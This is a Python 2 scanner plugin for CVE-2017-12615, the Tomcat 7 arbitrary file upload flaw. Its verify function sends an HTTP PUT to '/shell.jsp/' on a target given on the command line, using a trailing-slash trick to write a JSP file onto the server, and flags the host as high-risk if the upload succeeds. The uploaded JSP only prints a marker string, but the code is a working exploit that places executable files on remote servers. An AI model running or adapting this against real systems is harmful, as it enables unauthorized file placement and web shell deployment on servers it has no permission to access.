#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Time    : 2018/12/20 16:42
@Author  : zyg
@contact : k39aE465wlulvnkhT0i9MQ==@qq.com
@Site    : https://blog.csdn.net/DarkHQ/article/details/79302051
@File    : tomcat_uploadfile.py
@Desc    : tomcat7的任意文件上传漏洞，漏洞影响的tomcat版本为tomcat7.0.0-7.0.81版本, Tomcat 7.x版本内web.xml配置文件内含有readonly参数，参数值为false（默认不存在)
@Software: PyCharm
"""

import urllib
import httplib
import sys
import traceback
from ..t import T
from termcolor import cprint


class P:
    def __init__(self):
        T.__init__(self)

    def verify(self, ip='', port=''):
        results = {}
        results['result'] = False

        url = ip + ':' +port
        try:
            conn = httplib.HTTPConnection(url)
            conn.request("PUT", '/shell.jsp/','<% out.println("Tomcat CVE-2017-12615"); %>',{
                'user-agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
                'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                'cache-control': "no-cache",
                'connection': "keep-alive",
            })

            status = conn.getresponse().status

            if status == 201 or status == 204:
                results['result'] = True
                results['VerifyInfo'] = {}
                results['VerifyInfo']['type'] = '文件上传漏洞'
                results['VerifyInfo']['URL'] = url
                results['VerifyInfo']['refer'] = 'https://blog.csdn.net/DarkHQ/article/details/79302051'
                results['VerifyInfo']['payload'] = url
                results['VerifyInfo']['result'] = 'cve-2017-12615'
                results['VerifyInfo']['level'] = '高危'
                cprint(url + ' tomcat file upload', 'red')
        except Exception, e:
            print traceback.print_exc()

        return results

if __name__ == '__main__':
    print P().verify(ip=sys.argv[1], port=str(sys.argv[2]))